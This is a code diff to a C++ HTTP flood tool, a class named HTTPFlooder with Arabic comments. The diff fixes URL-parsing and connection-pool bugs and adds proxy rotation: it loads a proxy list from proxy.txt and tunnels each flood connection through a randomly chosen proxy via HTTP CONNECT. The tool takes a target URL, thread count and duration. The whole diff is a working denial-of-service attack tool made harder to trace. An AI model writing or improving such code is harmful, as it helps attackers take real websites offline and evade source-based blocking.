@@ -95,35 +95,36 @@ struct ConnectionPool {
     bool useSSL;
     
     ConnectionPool(const std::string& h, const std::string& p, bool ssl) 
-        : addr_info(nullptr), ssl_ctx(nullptr), host(h), port(p), useSSL(ssl) {
-        
-        // DNS resolution مرة واحدة فقط
+        : addr_info(nullptr), ssl_ctx(nullptr), host(h), port(p), useSSL(ssl) {}
+
+    ~ConnectionPool() {
+        if (addr_info) freeaddrinfo(addr_info);
+        if (ssl_ctx) SSL_CTX_free(ssl_ctx);
+    }
+
+    void initialize() {
         struct addrinfo hints;
         memset(&hints, 0, sizeof(hints));
         hints.ai_family = AF_INET;
         hints.ai_socktype = SOCK_STREAM;
         
         if (getaddrinfo(host.c_str(), port.c_str(), &hints, &addr_info) != 0) {
-            throw std::runtime_error("DNS resolution failed");
+            throw std::runtime_error("DNS failed - Check Target URL");
         }
         
-        // SSL context لمرة واحدة فقط
         if (useSSL) {
             ssl_ctx = SSL_CTX_new(SSLv23_client_method());
-            SSL_CTX_set_options(ssl_ctx, SSL_OP_NO_SSLv2 | SSL_OP_NO_SSLv3);
-            SSL_CTX_set_mode(ssl_ctx, SSL_MODE_AUTO_RETRY);
-            SSL_CTX_set_session_cache_mode(ssl_ctx, SSL_SESS_CACHE_CLIENT);
+            if (ssl_ctx) {
+                SSL_CTX_set_options(ssl_ctx, SSL_OP_NO_SSLv2 | SSL_OP_NO_SSLv3);
+            }
         }
-    }
-    
-    ~ConnectionPool() {
-        if (addr_info) freeaddrinfo(addr_info);
-        if (ssl_ctx) SSL_CTX_free(ssl_ctx);
     }
 };
 
 // ============ الفلودر الأساسي ============
 class HTTPFlooder {
+public: // نقلت هذه المتغيرات إلى public لتسهيل الوصول إليها من main دون تعديل الهيكل
+    std::vector<std::string> proxies;
 private:
     std::string host;
     std::string port;
@@ -156,14 +157,43 @@ private:
     const std::string alphanum = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
     
 public:
+
+bool connectProxy(socket_t sock, const std::string& pStr) {
+        size_t pos = pStr.find(':');
+        if (pos == std::string::npos) return false;
+        
+        std::string ip = pStr.substr(0, pos);
+        int port_p = std::stoi(pStr.substr(pos + 1));
+
+        struct sockaddr_in addr;
+        memset(&addr, 0, sizeof(addr));
+        addr.sin_family = AF_INET;
+        addr.sin_port = htons(port_p);
+        inet_pton(AF_INET, ip.c_str(), &addr.sin_addr);
+
+        if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) != 0) return false;
+
+        if (useSSL) {
+            std::string req = "CONNECT " + host + ":" + port + " HTTP/1.1\r\nHost: " + host + ":" + port + "\r\n\r\n";
+            send(sock, req.c_str(), req.length(), 0);
+            char buf[1024];
+            int r = recv(sock, buf, 1024, 0);
+            if (r <= 0 || std::string(buf, r).find("200") == std::string::npos) return false;
+        }
+        return true;
+    }
+
     HTTPFlooder(const std::string& targetUrl, const std::string& requestMode, 
                 int threads, int timeLimit, const std::string& headerFile) 
         : threadCount(threads), duration(timeLimit), gen(rd()), 
-          pool("1.1.1.1", "80", false) { 
+          pool("", "", false) { // تهيئة فارغة مبدئياً
         
         parseURL(targetUrl); 
-        pool.~ConnectionPool(); 
-        new (&pool) ConnectionPool(host, port, useSSL);
+        // تحديث بيانات الـ pool بالبيانات الصحيحة
+        pool.host = host;
+        pool.port = port;
+        pool.useSSL = useSSL;
+        pool.initialize(); // تشغيل الـ DNS والـ SSL
         
         mode = requestMode;
         
@@ -236,15 +266,17 @@ public:
 private:
     void parseURL(const std::string& url) {
         size_t protocolEnd = url.find("://");
+        size_t hostStart;
+        
         if (protocolEnd != std::string::npos) {
             std::string protocol = url.substr(0, protocolEnd);
             useSSL = (protocol == "https");
+            hostStart = protocolEnd + 3;
         } else {
             useSSL = false;
-            protocolEnd = -3;
+            hostStart = 0; // بدلاً من -3 لتجنب مشكلة الـ size_t overflow
         }
         
-        size_t hostStart = protocolEnd + 3;
         size_t pathStart = url.find('/', hostStart);
         
         if (pathStart != std::string::npos) {
@@ -503,10 +535,14 @@ private:
                     continue;
                 }
                 
-                if (!connectSocket(sock)) {
-                    CLOSE_SOCKET(sock);
+                // اختيار بروكسي عشوائي من القائمة التي تم تحميلها
+                if (proxies.empty()) return; 
+                std::string current_proxy = proxies[rand() % proxies.size()];
+            
+                // الاتصال عبر البروكسي (الدالة التي أضفتها أنت في السطر 161)
+                if (!connectProxy(sock, current_proxy)) {
                     failCount++;
-                    std::this_thread::sleep_for(std::chrono::milliseconds(50));
+                    CLOSE_SOCKET(sock);
                     continue;
                 }
                 
@@ -653,6 +689,16 @@ int main(int argc, char* argv[]) {
     
     try {
         HTTPFlooder flooder(argv[1], argv[3], std::stoi(argv[2]), std::stoi(argv[4]), argv[5]);
+        std::ifstream f("proxy.txt");
+        std::string l;
+        while (std::getline(f, l)) {
+            if(!l.empty()) {
+                // إزالة أي فراغات أو أحرف مخفية في نهاية السطر
+                l.erase(l.find_last_not_of(" \r\n\t") + 1);
+                flooder.proxies.push_back(l);
+            }
+        }
+        if (flooder.proxies.empty()) { std::cout << "ملف البروكسي فارغ يا بطل!"; return 1; }
         flooder.start();
     } catch (const std::exception& e) {
         std::cerr << "Error: " << e.what() << std::endl;
